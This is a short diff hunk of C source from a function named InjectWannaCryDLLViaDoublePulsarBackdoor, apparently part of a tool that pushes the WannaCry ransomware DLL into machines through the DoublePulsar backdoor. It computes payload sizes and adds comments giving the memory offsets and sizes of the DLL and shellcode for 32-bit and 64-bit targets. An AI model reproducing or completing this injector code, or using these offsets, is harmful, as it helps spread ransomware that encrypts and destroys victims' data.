@@ -173,6 +173,15 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	DWORD totalPayloadSize_x86 = 0x4060 + 0x1305 + WannacryFileSize;
 	DWORD totalPayloadSize_x64 = 0xc8a4 + 0x1800 + WannacryFileSize;
 	*/
+	
+	/*
+	/*
+	32-bit dll start address 0x40B020, size is 0x4060 bytes
+	64-bit dll start address 0x40F080, size is 0xc8a4 bytes
+
+	32-bit shellcode start address 0x42E758, size is 0x1305 bytes
+	64-bit shellcode start address 0x42FA60, size 0x1800 bytes
+	*/
 	int shellcode_payload_size;
 	int DLLSize;
 	if(architectureType)
